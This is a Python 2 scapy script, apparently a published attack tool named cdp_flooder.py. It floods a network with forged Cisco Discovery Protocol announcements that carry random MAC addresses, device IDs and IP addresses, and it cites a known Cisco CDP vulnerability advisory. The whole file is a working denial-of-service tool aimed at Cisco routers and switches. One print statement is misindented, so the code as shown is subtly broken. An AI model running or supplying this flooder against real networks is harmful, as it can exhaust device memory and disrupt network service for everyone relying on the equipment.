#!/usr/bin/env python
# -*- encoding: utf-8 -*-
# What is CDP:
# http://www.cisco.com/en/US/docs/ios/12_1/configfun/configuration/guide/fcd301c.html
#
# CDP Packet format:
# http://www.cisco.com/univercd/cc/td/doc/product/lan/trsrb/frames.htm
#
# Vulnerability explanation:
# http://securityvulns.com/Cdocument84.html
#
# Cisco Advisory:
# www.cisco.com/application/pdf/paws/13621/cdp_issue.pdf


__author__ = '090h'
__license__ = 'GPL'

from sys import argv, exit
from os import path

from scapy.all import *
from sys import argv
from sys import exit
import string
import random

load_contrib('cdp')

if len(argv) != 2:
    print "Usage: cdp_flooder.py [number of packets]"
    exit(0)


def cdpDeviceIDgen(size=2, chars=string.ascii_uppercase + string.digits + string.ascii_lowercase):
        return ''.join(random.choice(chars) for x in range(size))

def cdppacketgen():

        etherframe      = Ether()                       #Start definition of Ethernet Frame
        etherframe.dst  = '01:00:0c:cc:cc:cc'           #Set Ethernet Frame destination MAC to Ciscos Broadcast MAC
        etherframe.src  = RandMAC()                     #Set Random source MAC address
        etherframe.type = 0x011e                        #CDP uses Type field for length information

        llcFrame      = LLC()                           #Start definition of Link Layer Control Frame
        llcFrame.dsap = 170                             #DSAP: SNAP (0xaa) IG Bit: Individual
        llcFrame.ssap = 170                             #SSAP: SNAP (0xaa) CR Bit: Command
        llcFrame.ctrl = 3                               #Control field Frame Type: Unumbered frame (0x03)

        snapFrame      = SNAP()                         #Start definition of SNAP Frame (belongs to LLC Frame)
        snapFrame.OUI  = 12                             #Organization Code: Cisco hex(0x00000c) = int(12)
        snapFrame.code = 8192                           #PID (EtherType): CDP hex(0x2000) = int(8192)

        cdpHeader      = CDPv2_HDR()                    #Start definition of CDPv2 Header
        cdpHeader.vers = 1                              #CDP Version: 1 - its always 1
        cdpHeader.ttl  = 180                            #TTL: 180 seconds

        cdpDeviceID      = CDPMsgDeviceID()             #Start definition of CDP Message Device ID
        cdpDeviceID.type = 1                            #Type: Device ID hex(0x0001) = int(1)
        cdpDeviceID.len  = 6                            #Length: 6 (Type(2) -> 0x00 0x01) + (Length(2) -> 0x00 0x0c) + (DeviceID(2))
        cdpDeviceID.val  = cdpDeviceIDgen()             #Generate random Device ID (2 chars uppercase + int = lowercase)

        cdpAddrv4         = CDPAddrRecordIPv4()         #Start Address Record information for IPv4 belongs to CDP Message Address
        cdpAddrv4.ptype   = 1                           #Address protocol type: NLPID
        cdpAddrv4.plen    = 1                           #Protocol Length: 1
        cdpAddrv4.proto   = '\xcc'                      #Protocol: IP
        cdpAddrv4.addrlen = 4                           #Address length: 4 (e.g. int(192.168.1.1) = hex(0xc0 0xa8 0x01 0x01)
        cdpAddrv4.addr    = str(RandIP())               #Generate random source IP address

        cdpAddr       = CDPMsgAddr()                    #Start definition of CDP Message Address
        cdpAddr.type  = 2                               #Type: Address (0x0002)
        cdpAddr.len   = 17                              #Length: hex(0x0011) = int(17)
        cdpAddr.naddr = 1                               #Number of addresses: hex(0x00000001) = int(1)
        cdpAddr.addr  = [cdpAddrv4]                     #Pass CDP Address IPv4 information

        cdpPortID       = CDPMsgPortID()                #Start definition of CDP Message Port ID
        cdpPortID.type  = 3                             #type: Port ID (0x0003)
        cdpPortID.len   = 13                            #Length: 13
        cdpPortID.iface = 'Ethernet0'                   #Interface string (can be changed to what you like - dont forget the length field)

        cdpCapabilities        = CDPMsgCapabilities()   #Start definition of CDP Message Capabilities
        cdpCapabilities.type   = 4                      #Type: Capabilities (0x0004)
        cdpCapabilities.length = 8                      #Length: 8
        cdpCapabilities.cap    = 1                      #Capability: Router (0x01), TB Bridge (0x02), SR Bridge (0x04), Switch that provides both Layer 2 and/or Layer 3 switching (0x08), Host (0x10), IGMP conditional filtering (0x20) and Repeater (0x40)

        cdpSoftVer      = CDPMsgSoftwareVersion()       #Start definition of CDP Message Software Version
        cdpSoftVer.type = 5                             #Type: Software Version (0x0005)
        cdpSoftVer.len  = 216                           #Length: 216
        cdpSoftVer.val  = 'Cisco Internetwork Operating System Software \nIOS (tm) 1600 Software (C1600-NY-L), Version 11.2(12)P, RELEASE SOFTWARE (fc1)\nCopyright (c) 1986-1998 by cisco Systems, Inc.\nCompiled Tue 03-Mar-98 06:33 by dschwart'

        cdpPlatform      = CDPMsgPlatform()             #Statr definition of CDP Message Platform
        cdpPlatform.type = 6                            #Type: Platform (0x0006)
        cdpPlatform.len  = 14                           #Length: 14
        cdpPlatform.val  = 'cisco 1601'                 #Platform = cisco 1601 (can be changed, dont forget the Length)


        #Assemble Packet
    print etherframe.src+' -> '+etherframe.dst+' / Device ID: '+cdpDeviceID.val+' / src IP: '+cdpAddrv4.addr
        cdppacket = etherframe/llcFrame/snapFrame/cdpHeader/cdpDeviceID/cdpAddr/cdpPortID/cdpCapabilities/cdpSoftVer/cdpPlatform
        return cdppacket

i = 0
while i < int(argv[1]):
    i += 1

    packet = cdppacketgen()
    sendp(packet, verbose=0)